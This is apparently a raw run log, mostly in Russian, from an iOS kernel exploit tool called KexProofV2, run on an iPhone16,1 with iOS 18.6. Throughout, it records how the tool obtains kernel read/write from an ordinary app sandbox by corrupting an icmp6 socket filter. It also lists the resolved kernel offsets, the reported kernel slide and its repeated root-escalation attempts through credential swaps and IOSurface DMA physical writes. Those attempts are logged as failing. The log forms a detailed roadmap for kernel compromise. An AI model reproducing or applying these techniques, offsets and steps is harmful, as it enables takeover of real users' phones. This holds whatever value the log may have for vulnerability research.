+  [SCAN-Z2] прогресс 0x50000/0x780b6 (чтений 262144)
+  [SCAN-Z2] прогресс 0x58000/0x780b6 (чтений 294912)
+  [SCAN-Z2] ucred-кандидат pa=0x10166614000: label+uid сошлись, live-сверка — мимо (расхождение @+0)
+  [SCAN-Z2] образец чужого ucred сохранён: pa=0x10166614000 (тип 24) — VMPROBE будет
+  [SCAN-Z2] прогресс 0x60000/0x780b6 (чтений 327680)
+  [SCAN-Z2] прогресс 0x68000/0x780b6 (чтений 360448)
+  [SCAN-Z2] прогресс 0x70000/0x780b6 (чтений 393216)
+  [SCAN-Z2] прогресс 0x78000/0x780b6 (чтений 425984)
+  [SCAN-Z2] финиш: кадров=0x780b6 чтений=426166 ucredPA=0 roFieldPA=0x1009c3da488 — ЦЕЛЬ НАЙДЕНА ★
+  [SCAN-Z2] гистограмма типов (кадров 491702, нет-таблицы 0): 11:338418 14:70625 16:11 17:384 18:1 19:6526 20:5 23:89 24:44 33:9171 47:1 48:9 49:7 50:2 51:8 52:9 53:21 54:40 55:794 56:1
+  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)
+  [SCAN-Z2-BAND] прогресс 0x4000 (чтений 1)
+  [SCAN-Z2-BAND] прогресс 0x6000 (чтений 8193)
+  [SCAN-Z2-BAND] прогресс 0x8000 (чтений 16385)
+  [SCAN-Z2-BAND] прогресс 0xa000 (чтений 24577)
+  [SCAN-Z2-BAND] прогресс 0xc000 (чтений 32769)
+  [SCAN-Z2-BAND] прогресс 0xe000 (чтений 40961)
+  [SCAN-Z2-BAND] финиш: чтений=49152 ucredPA=0 roFieldPA=0x1009c3da488
+  [T18-ENUM] перебор кадров типа 24 из frame table (наш ucred — в зоне этого типа)
+  [T18-ENUM] кадров типа 24: всего 99, высоких 57, низких 16
+  [T18-ENUM] низкий кандидат[0] pa=0x1000b8d0000
+  [T18-ENUM] низкий кандидат[1] pa=0x1000b8dc000
+  [T18-ENUM] низкий кандидат[2] pa=0x1000bc34000
+  [T18-ENUM] низкий кандидат[3] pa=0x1000bc48000
+  [T18-ENUM] низкий кандидат[4] pa=0x1000bf38000
+  [T18-ENUM] низкий кандидат[5] pa=0x1000bf3c000
+  [T18-ENUM] низкий кандидат[6] pa=0x1000bf40000
+  [T18-ENUM] низкий кандидат[7] pa=0x1000bf48000
+  [T18-ENUM] низкий кандидат[8] pa=0x1000bf4c000
+  [T18-ENUM] низкий кандидат[9] pa=0x1000bf50000
+  [T18-ENUM] низкий кандидат[10] pa=0x1000bf60000
+  [T18-ENUM] низкий кандидат[11] pa=0x1000bf64000
+  [T18-ENUM] низкий кандидат[12] pa=0x1000bf68000
+  [T18-ENUM] низкий кандидат[13] pa=0x1000bf6c000
+  [T18-ENUM] низкий кандидат[14] pa=0x1000bf70000
+  [T18-ENUM] низкий кандидат[15] pa=0x1000bf74000
+  [T18-ENUM] низких 16 — пробуем первый pa=0x1000b8d0000 (список выше для добора)
+  [PSWAP-B] KVA-верификация маркером: papt=✓ linear=✗ → KVA=0xfffffff1609a4000
+  [PSWAP-B] forge page: PA=0x10118c8c000 KVA=0xfffffff1609a4000 → поле 0x1009c3da488
+  [PHYSWRITE8v2] target=0x1009c3d8000+0x2488 payload=0xfffffff1609a4000 kr=0x0
+  [PSWAP-B] запись=kr=0 readback=0xffffffdf41fc87c0 (ждём 0xfffffff1609a4000) → НЕ ПРИЛИПЛО
+  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback
+  [FORGE] pageVA=0xffffffdf41fc8000 pagePA=0x1000b8d0000 uoff=0x7c0 — валидация PA: СОШЛАСЬ
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [INPL] physwrite8: 00000 | readback cr_uid=501 groups0=501 cr_label=0xc09dffdf41ddacc0 | getuid()=501 getgid()=501
+  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж
+  [FORGE] DEP-хиты перепатчены на ucredPFN (1 шт)
+  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x0 — жду DMA в ucred
+  [FORGE] getuid()=501 getgid()=501 | cr_uid=501 cr_label=0xc09dffdf41ddacc0
+
+
+--- Полный журнал ---
+=== запуск KexProofV2 2.0.16 @ 2026-10-06 05:34:45 +0000 ===
+KexProofV2 загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов.
+[auto] запускаю эксплойт сам (автостарт)
+=== KexProofV2 2.0.16 — iPhone16,1, Darwin 24.6.0 ===
+iOS 18.6
+
+[Этап 1/4] Патчфайндинг (XPF)
+kernelcache: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/kernelcache
+sptm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/sptm.img4
+txm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/txm.img4
+XPF: kernel загружен, base=0xfffffff007004000 darwin=24.6.0 sptm=–¥–∞ txm=–¥–∞
+[xpf] resolve kernelConstant.kernel_el...
+[xpf] resolve kernelSymbol.start_first_cpu...
+[xpf] resolve kernelSymbol.allproc...
+[xpf] resolve kernelSymbol.kalloc_data_external...
+[xpf] resolve kernelSymbol.fatal_error_fmt...
+[xpf] resolve kernelSymbol.kfree_data_external...
+[xpf] resolve kernelSymbol.SPTMArgs...
+[xpf] resolve kernelSymbol.cpu_ttep...
+[xpf] resolve kernelSymbol.arm_vm_init...
+[xpf] resolve kernelSymbol.gVirtBase...
+[xpf] resolve kernelSymbol.gPhysBase...
+[xpf] resolve kernelSymbol.gPhysSize...
+[xpf] resolve kernelConstant.pointer_mask...
+[xpf] resolve kernelSymbol.pointer_mask...
+[xpf] resolve kernelSymbol.pmap_bootstrap...
+[xpf] resolve kernelConstant.T1SZ_BOOT...
+[xpf] resolve kernelConstant.ARM_TT_L1_INDEX_MASK...
+[xpf] resolve kernelSymbol.txm_trustcache_root...
+[xpf] resolve kernelSymbol.txm_deviceTreeTrustCacheRange...
+[xpf] resolve kernelSymbol.vm_page_array_beginning_addr...
+[xpf] resolve kernelSymbol.vm_page_array_ending_addr...
+[xpf] resolve kernelSymbol.vm_first_phys_ppnum...
+[xpf] resolve kernelSymbol.vm_first_phys...
+[xpf] resolve kernelSymbol.sptm_get_page_table_refcnt...
+[xpf] resolve kernelSymbol.vm_last_phys...
+[xpf] resolve kernelSymbol.pp_attr_table...
+[xpf] resolve kernelSymbol.pmap_enter_pv...
+[xpf] resolve kernelSymbol.pv_head_table...
+[xpf] resolve kernelSymbol.pv_alloc...
+[xpf] resolve kernelSymbol.libsptm_papt_ranges...
+[xpf] resolve kernelSymbol.libsptm_init...
+[xpf] resolve kernelSymbol.wfe_timeout_configure...
+[xpf] resolve kernelSymbol.libsptm_n_papt_ranges...
+[xpf] resolve kernelSymbol.papt_ranges_compressed...
+[xpf] resolve kernelSymbol.papt_ranges_update...
+[xpf] resolve kernelSymbol.n_papt_ranges_compressed...
+[xpf] resolve kernelSymbol.libsptm_frame_table...
+[xpf] resolve kernelSymbol.libsptm_frame_type_params...
+[xpf] resolve kernelStruct.sptm_frame_type_descriptor.struct_size...
+[xpf] resolve kernelStruct.proc.struct_size...
+[xpf] resolve kernelStruct.task.itk_space...
+[xpf] resolve kernelSymbol.task_collect_crash_info...
+[xpf] resolve kernelSymbol.task_crashinfo_release_ref...
+[xpf] resolve kernelStruct.vm_map.pmap...
+[xpf] resolve kernelStruct.IOSurface.ranges...
+[xpf] resolve kernelStruct.IOSurface.IOMemoryDescriptor_withAddressRanges_ref...
+[xpf] resolve kernelStruct.IOSurface.rangeCount...
+[xpf] resolve kernelConstant.nsysent...
+[xpf] resolve kernelSymbol.proc_get_syscall_filter_mask_size...
+[xpf] resolve kernelConstant.mach_trap_count...
+[xpf] resolve kernelSymbol.mach_kobj_count...
+Словарь оффсетов XPF:
+  0x0000000000000060 <- kernelStruct.sptm_frame_type_descriptor.struct_size
+  0xfffffff0270d8bf0 <- kernelSymbol.n_papt_ranges_compressed
+  0xfffffff007b37750 <- kernelSymbol.libsptm_n_papt_ranges
+  0xfffffff007aa2968 <- kernelSymbol.pv_head_table
+  0x0000000000000011 <- kernelConstant.T1SZ_BOOT
+  0xfffffff007b37768 <- kernelSymbol.vm_last_phys
+  0xfffffff007aa29a8 <- kernelSymbol.vm_first_phys_ppnum
+  0xfffffff007aa29b0 <- kernelSymbol.vm_page_array_ending_addr
+  0xfffffff007aa29b8 <- kernelSymbol.vm_page_array_beginning_addr
+  0xfffffff007af4b48 <- kernelSymbol.gPhysBase
+  0xfffffff007aa32b0 <- kernelSymbol.cpu_ttep
+  0xfffffff00802b7f8 <- kernelSymbol.kalloc_data_external
+  0xfffffff007ad9f40 <- kernelSymbol.mach_kobj_count
+  0x00000000000003a4 <- kernelStruct.IOSurface.rangeCount
+  0x0000000000000040 <- kernelStruct.vm_map.pmap
+  0xfffffff007af4b50 <- kernelSymbol.gPhysSize
+  0x0000000000000001 <- kernelConstant.kernel_el
+  0xfffffff027004000 <- kernelConstant.staticSptmBase
+  0xfffffff007004000 <- kernelConstant.staticBase
+  0x000000000000022e <- kernelConstant.nsysent
+  0x0000000000000740 <- kernelStruct.proc.struct_size
+  0xfffffff007b37760 <- kernelSymbol.vm_first_phys
+  0xfffffff017004000 <- kernelConstant.staticTxmBase
+  0x0000000000000080 <- kernelConstant.mach_trap_count
+  0xfffffff007b37790 <- kernelSymbol.libsptm_frame_type_params
+  0xfffffff0270d8c00 <- kernelSymbol.papt_ranges_compressed
+  0xfffffff007b37758 <- kernelSymbol.libsptm_papt_ranges
+  0xfffffff007aa2960 <- kernelSymbol.pp_attr_table
+  0x0000000000000360 <- kernelStruct.IOSurface.ranges
+  0x0000000000000318 <- kernelStruct.task.itk_space
+  0x00007ff000000000 <- kernelConstant.ARM_TT_L1_INDEX_MASK
+  0xfffffff00aaa2608 <- kernelSymbol.allproc
+  0xfffffff007b37788 <- kernelSymbol.libsptm_frame_table
+  0xfffffff017010590 <- kernelSymbol.txm_trustcache_root
+  0xffff800000000000 <- kernelConstant.pointer_mask
+  0xfffffff007ac4c70 <- kernelSymbol.gVirtBase
+  0xfffffff007b36a48 <- kernelSymbol.SPTMArgs
+  0xfffffff00802be88 <- kernelSymbol.kfree_data_external
+gSystemInfo заполнена (динамические + жёстко заданные оффсеты)
+
+[Этап 2/4] Эксплойт ClearSword (может занять несколько минут)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+machine: iPhone16,1
+hw.cpufamily: 0x2876f5b5
+[KP] engine start: iOS 18.6, iPhone16,1, cpufamily 0x2876f5b5 — offsets: icmp6filt=0x148 chksum=0x150 pcbinfo=0x38 ipi_zone=0x68 zone_elem_size=0x34 itk_space=0x318
+[+] Running on non-A18 device
+[i] low-RAM device (7682MB) — search space scaled to 0xf016 pages (floor 0x8000)
+[i] totalSearchMappingPagesNum: 0xf016
+[i] searchMappingSize: 0x8000000
+[i] totalSearchMappingSize: 0x3c058000
+[i] searchMappingNum: 0x7
+[+] physicalMappingAddress: 0x1012fc000
+[+] pcAddress: 0xf14bd0000
+[+] pe_v1 spray/race cycle 1/6
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[i] socketPortsCount: 22528
+[i] startPcbId: 4 endPcbId: 45058
+[i] looking in search mapping: 0
+[+] pcbStartOffset: 0x400 (filt=0x148 gencnt=0x78)
+[+] targetInpGencnt: 0x1626
+[+] inpListNextPointer: 0xffffffe10a74ffe0
+[+] icmp6Filter: 0xffffffe2dac13480
+[STAGED] stage 1/2 pass — readonly layout validated on-device (filt=0x148 gencnt=0x78), kernel writes measured so far: 0 (BUG.5); corrupting single socket
+[+] alias write (icmp6filt): 0xffffffe10a750128 verified (writeKr=0, attempts=1)
+[+] re-alias (neighbor): 0xffffffe10a750948 verified (writeKr=0, attempts=1)
+[STAGED] re-alias на newer якорь 0xffffffe10a750948: verified
+[+] probe: rw в окне @+0x800 (gencnt=0x1628 → порт #2834, newer якорь) — бинд по окну
+[probe] selftest: getsockopt(control fd=10) через алиас → res=0 len=32 qword0=0xffffffe2dac134a0 (в окне icmp6Filter был 0xffffffe2dac13480)
+[+] probe fds: пара открыта — control idx=2833 fd=10, rw idx=2834 fd=11
+[STAGED] zone window: pcb 0xffffffe10a750400 zone bucket not a kalloc class (raw 0) (qword 0) vs field span 0x160 -> declaring 0x160 bytes (field span (bucket unknown))
+[STAGED] probe (control inp6_chksum at pcb+0x150 = 0xffffffe10a750550): read 0, wrote 0x4141414141414141, read back 0x4141414141414141, restored 0 — krw write+read verified (control-side, clamped)
+[STAGED] probe promoted: icmp6filt corruption KEPT (idx=2833), proven by an inp6_chksum round trip — this socket IS the krw primitive; restore is owned by the caller (run_write_test / staged stage-2 failure path)
+[cleanup] pe_v1: memory object 0x590703 released (kr=0)
+[cleanup] sockets_release: 24576 sprayed socket fileports released
+[cleanup] pe_v1: search mapping 0xda81cc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x6bef90000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x668428000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x4266a0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xc9b0c8000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x5c0cb0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xb4aacc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: searchMappings tracker released (0 left, BUG.2)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[+] pe_v1 socket corruption succeeded
+[cleanup] pe_v1: gencnt tracker released (1 entries, BUG.2)
+[+] highestSuccessIdx: 497
+[+] successReadCount: 514
+[SCAN] kernel writes issued this attempt: 2 write(s), 64 byte(s) [measured by kwrite_counter, BUG.5]
+[SCAN]   by route: early_kwrite32bytes=0  early_kwrite64=0  krw_zone_write_block=2  (refused: 0)
+[cleanup] kexploit: free thread stopped + joined (BUG.2)
+[cleanup] kexploit: target fds closed (readFd=8 writeFd=9, BUG.2)
+[+] kernel base scan start: 0xfffffff04bd08000 (zv_name=0xfffffff04bd09d38)
+    scan iter 0 base=0xfffffff04bd04000 val=0x6e6f207369207325
+[STAGED] stage 2/2 pass — krw read chain + kernel magic verified (base=0xfffffff04bc98000 slide=0x44c94000); full chain proceeding
+early_kread64(0xfffffff04bc98000) -> 0x100000cfeedfacf
+win??
+[engine] returning 0 — промоушн и база ядра подтверждены; повторный pe_v1 в этом процессе запрещён
+[+] readFd: 8
+[+] writeFd: 9
+[+] pcObject: 40743
+[+] Corrupting icmp6filter pointer...
+[+] Found control_socket at idx: 2833
+Эксплойт УСПЕШЕН. kernel slide = 0x44c94000, kernel base = 0xfffffff04bc98000
+kreadbuf=0xbd7f80010037806c kwritebuf=0xbb35000100378088 minSafeRead=0x20
+
+[Этап 3/4] Константы загрузки и трансляция адресов
+  gVirtBase: raw=0xfffffff026af0000 strip=0xfffffff026af0000
+  gPhysBase: raw=0x0000010002af0000 strip=0x0000010002af0000
+  gPhysSize: raw=0x00000001e02d8000 strip=0x00000001e02d8000
+  cpu_ttep: raw=0x0000010007ce4000 ttbr-phys=0x0000010007ce4000 va-формой=0x0000010007ce4000
+  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote
+  EXP-02 (формула, без голосования): sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000
+  EXP-02 (формула): txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+  base=0xfffffff04bc98000 virtBase=0xfffffff026af0000 physBase=0x10002af0000 physSize=0x1e02d8000 cpuTTEP=0x10007ce4000 sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000 txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+
+[E9 auto] root через ucred swap — сразу после победы, без нажатий
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+
+=== EXP-09: root через подмену указателя p_ucred (heap-only) ===
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.
+Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).
+[E9 auto] uid сейчас: 501 (–Ω–µ root)
+Этапы 1-3 готовы, KRW жив. Дамп — отдельной кнопкой (дамп пишется инкрементально, паника не сотрёт готовые секции).
+=== IOSurface backing-PA swap: physwrite через DMA ===
+  [DCPAV] DCPAVControllerProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVDeviceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVServiceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVVideoInterfaceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVAudioInterfaceProxy: сервис НЕ найден
+  surfaces: srcID=15 dstID=12 (подменяем backing у dst)
+  процесс "KexProofV2" (p_name="KexProofV2") @ 0xffffffe2d77dd660 (узлов=0)
+  контрольная страница: VA=0x1017dc000 PA=0x10142234000 (заполнена 0xCC)
+  [CAL] physmap-алиасы (рано, маркер жив): linear=0xaa0103f9 papt=0xcafebabe → PAPT ✓
+  ctlPA валидация: phystokv(0x10142234000)=0xcafebabe → ВЕРНО
+  backing PA dst = 0x10030520000 (vtophys пикселей VA=0x10450c000), маркер по phystokv: 0x41544159 → ПОДТВЕРЖДЁН
+  SCAN A (после create, до churn/submit):
+  frame table: raw=0xfffffff05078c000 → VA 0xfffffff05078c000
+    [A] hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148
+    [A] hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000
+    [A] hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000
+  [A] попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  isTable=0xffffffed0cd8c000 (звенья: proc_ro=0xffffffdf41f82460 task=0xffffffe2d77ddda0 itk=0xd1e6ffe027ed2728)
+  ip_kobject oracle: task port VA=0xffffffe10b4aec50 selfTask=0xffffffe2d77ddda0 → ip_kobject @ +0x48 (статика +0x48)
+  порт-маршрут: smp=0x347e77 kobj=0xffffffe028843120 vt=0xfffffff04c797d68 (file 0xfffffff007b03d68; SendRight ждём 0xfffffff04cb834c8)
+    kobj+0x00: raw=0x128b7ff04c797d68 untag=0xfffffff04c797d68 → [+0x10]=0x4d297234 surfFast=0
+    kobj+0x08: raw=0x0000000100000001 untag=0x0000000100000001
+    kobj+0x10: raw=0x0000010122000000 untag=0x0000010122000000
+    kobj+0x18: raw=000000000000000000 untag=000000000000000000
+    kobj+0x20: raw=0xffffffe028840c60 untag=0xffffffe028840c60 → [+0x10]=0x22000000 surfFast=0
+    kobj+0x28: raw=0xffffffe10864e860 untag=0xffffffe10864e860 → [+0x10]=0 surfFast=0
+    kobj+0x30: raw=0x52c47fe2d9864fa0 untag=0xffffffe2d9864fa0 → [+0x10]=0xf41ec400 surfFast=0
+    IOMachPort: fPort=0xffffffe10864e860 kotype=0x1b fObject=0xffffffe2d9864fa0 vt=0xfffffff04cb834c8 (file 0xfffffff007eef4c8 = SendRight!)
+    SendRight ✓: owner(Root)=0xffffffe1f41ec400 IOSurface=0xffffffe10e25ad40 ([surf+0x10]=0xc ждём 12) surfFast=0
+  ★ smp IOMachPort-хоп → IOSurface 0xffffffe10e25ad40
+  ★ порт-маршрут дал surfVA=0xffffffe10e25ad40 — слоты/подмена ДО submit
+  IOSurface 0xffffffe10e25ad40: rangeObj(+0x178)=0xffffffedf8c908a0 plane(+0x30)=0xffffffdf4485e3e8 ranges(+0x360)=0 rangeCount(+0x3a4)=0
+  planeDesc vtable: 0xfffffff04c7c7db8 (file 0xfffffff007b33db8) — класс IOMD
+    IOMD lvl0: md=0xffffffdf4485e3e8 [+0x60]=0xffffffe10e3e9fe0 count=1 [0]=000000000000000000 [8]=0x0000000000080000
+    pd+0000: 0x44a67ff04c7c7db8
+    pd+0x08: 0x0000000000010002
+    pd+0x10: 0xffffffe0264f9300
+    pd+0x18: 0xffffffe1f3b0b580
+    pd+0x20: 0x0000000000510513
+    pd+0x28: 0xffffffe028713880
+    pd+0x30: 0x000000000058004e
+    pd+0x38: 000000000000000000
+    pd+0x40: 000000000000000000
+    pd+0x48: 000000000000000000
+    pd+0x50: 0x0000000000080000
+    pd+0x58: 000000000000000000
+    pd+0x60: 0xffffffe10e3e9fe0
+    pd+0x68: 0x0000000000000001
+    pd+0x70: 0xffffffe2d9a801e0
+    pd+0x78: 000000000000000000
+    pd+0x80: 000000000000000000
+    pd+0x88: 0x0000000100000000
+    pd+0x90: 0xffffffe10d754250
+    pd+0x98: 0x0406e1fe00000020
+    pd+0xa0: 000000000000000000
+    pd+0xa8: 0xffffffe2da0d4b70
+    pd+0xb0: 000000000000000000
+    pd+0xb8: 000000000000000000
+    pd+0xc0: 0x0000000000080000
+    pd+0xc8: 0x0000000000004000
+    pd+0xd0: 0x0000000000110063
+    pd+0xd8: 000000000000000000
+    pd+0xe0: 0x0000000000000008
+    pd+0xe8: 0xdea87ff04c7c7db8
+    pd+0xf0: 0x0000000000010004
+    pd+0xf8: 0xffffffe0264faf20
+  IOSurface найден, но pfn-слотов нет — уходим в старые пути
+  [frame-type census] type=0x11 (pa=0x101aa45c000)
+  [frame-type census] type=0x13 (pa=0x1017f9c8410)
+  [CHAIN-S] srcVA=0xffffffe10e25b100 pd=0xffffffdf4484f520 type=0x10 buf=0xffffffe02813cc80 count=0x20 entry0=0x000000040400ae68 — маркеры сошлись (physread вооружён)
+  [CHAIN] pd=0xffffffdf4485e3e8 vt=0xfffffff04c7c7db8 type=0x10 hdr=0xffffffe10d754250 buf=0xffffffe02813c800 count=0x20 flags=0xc0 — маркеры сошлись, патчим entries
+  [CHAIN] ★ entry[0] @ 0xffffffe02813c830: 0x000000040400c148 → ctlPFN 0x405088d (зона: не зона/VM)
+      readback: 0x000000040405088d — ПРИЛИПЛО
+  [PH] VAD (VA-field deputy) — старт
+  [frame-type census] type=0x8 (pa=0x10007ce7fe8)
+  [frame-type census] type=0x9 (pa=0x1000974fd10)
+  [frame-type census] type=0x21 (pa=0x1018b9323e8)
+  [frame-type census] type=0xb (pa=0x1000d2e08a0)
+  [frame-type census] type=0xc (pa=0x10007797db8)
+  [VAD] VA-поле не найдено (пулов=15, полей проверено=66, physmap-скип=60) — следующий шаг: pv_head/второй уровень
+  [PH] PAR (parent-ranges) — старт
+  [PAR] parentMD=0xffffffe10e3e9fe0 arr=0x66eadc000 count=32768
+  [VDB] [planeDesc+0xb8] = 000000000000000000 (ноль — ranges-based)
+  [VDB] vmctx [0x7b33f28]=0xffffffde0c3ba890 (sym 0xfffffff04c7c7f28)
+    vmctx+0: 0x0000000033000000
+    vmctx+0x8: 0x0000000000420000
+    vmctx+0x10: 0xffffffde0c3beed0
+    vmctx+0x18: 0xffffffde0c3bfdd0
+    vmctx+0x20: 0xffffffdc00000000
+    vmctx+0x28: 0xfffffffbffffffff
+    vmctx+0x30: 0x0000000e00000883
+    vmctx+0x38: 0xffffffde0c452d60
+    vmctx+0x40: 0x6ed17ff04f714170
+    vmctx+0x48: 0x00000014c5988000
+    vmctx+0x50: 0x7fffffffffffffff
+    vmctx+0x58: 0x7fffffffffffffff
+    vmctx+0x60: 0x0000000fc0000000
+    vmctx+0x70: 0x00000000000007c7
+    vmctx+0xc0: 0xffffffde0caf04a0
+    vmctx+0xc8: 0xffffffdef292dac0
+    vmctx+0xd0: 0xffffffde0c3c14e0
+    vmctx+0xd8: 0x000f47b900000080
+    vmctx+0xe8: 0x0000000000000001
+    vmctx+0xf0: 0x0000000033000000
+    vmctx+0xf8: 0x0000000000420000
+    vmctx+0x100: 0xffffffde0c5d90d0
+    vmctx+0x108: 0xffffffde0c462890
+    vmctx+0x110: 0xffffffedf8c88000
+    vmctx+0x118: 0xffffffee58c88000
+    vmctx+0x120: 0x0001000e00000508
+    vmctx+0x128: 0xffffffde0c86c560
+    vmctx+0x130: 0x0bb8fff04f714170
+    vmctx+0x138: 0x0000000006648000
+    vmctx+0x140: 0x7fffffffffffffff
+    vmctx+0x148: 0x7fffffffffffffff
+    vmctx+0x150: 0x0000000fc0000000
+    vmctx+0x160: 0x0000000000000002
+    vmctx+0x1b0: 0xffffffde0c99d8f0
+    vmctx+0x1b8: 0xffffffdef292aa00
+    vmctx+0x1c0: 0xffffffdef2407260
+    vmctx+0x1c8: 0x0000194000000080
+    vmctx+0x1d8: 0x0000000000000011
+    vmctx+0x1e0: 0x0000000033000000
+    vmctx+0x1e8: 0x0000000000420000
+    vmctx+0x1f0: 0xffffffde0c3baa80
+    vmctx+0x1f8: 0xffffffde0c3baa80
+  [VDB2] маркер-hits по surf-pointees: 0
+    surf+0x8: 0x0000000200000001 (arena?)
+    surf+0x70: 0x0000000001010004
+    surf+0x80: 0x0000000042475241 (arena?)
+    surf+0x3b8: 0x000001eb0005892d (PA?)
+    surf+0x3c8: 0x0000000200000001 (arena?)
+    pd+0x20: 0x0000000000510513
+    pd+0x30: 0x000000000058004e
+    pd+0x88: 0x0000000100000000 (arena?)
+    pd+0xd0: 0x0000000000110063
+  [PH] OWN (owner-MD база) — старт
+  [OWN] A: [pd+0x28]=0xffffffe028713880 [P]=0x1 (signed — не пишем)
+  [OWN] B: [pd+0x90]=0xffffffe10d754250 recs=0xffffffe02813c800 ownerMD=0
+  [PH] RMD (root-MD page-list) — старт
+  [RMD] pd=0xffffffdf4485e3e8 rootMD=0xffffffe10e3e9fe0
+  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора
+  victim#1 async submit (real src): kr=0x0 — mapping кэшируется на pipe
+  [SPC] pd=0xffffffdf4485e3e8 spec([pd+0x60])=0xffffffe10e3e9fe0
+  [SPC] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec+0: 000000000000000000
+    spec+0x8: 0x0000000000080000
+    spec+0x10: 0x0000000483f88000
+    spec+0x18: 0x0000000000100000
+    spec+0x20: 0xffffffedfcc54000
+    spec+0x28: 0x0000000000004000
+    spec+0x30: 0x000000066e8dc000
+    spec+0x38: 0x0000000000100000
+    spec+0x40: 0xffffffedfede4000
+    spec+0x48: 0x0000000000004000
+    spec+0x50: 0x000000066e9dc000
+    spec+0x58: 0x0000000000100000
+  [SPC] fallback: UC=0xffffffdf440cdcd0 pipe=0xffffffe1f38b2400 node=0xffffffe0269c9648
+  [frame-type census] type=0x15 (pa=0x1000b8dbf40)
+  [SPC] spec+0x58 с pfn32 нигде не найден
+  [frame-type census] type=0x6 (pa=0x100057352bc)
+  [OPC-E] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):
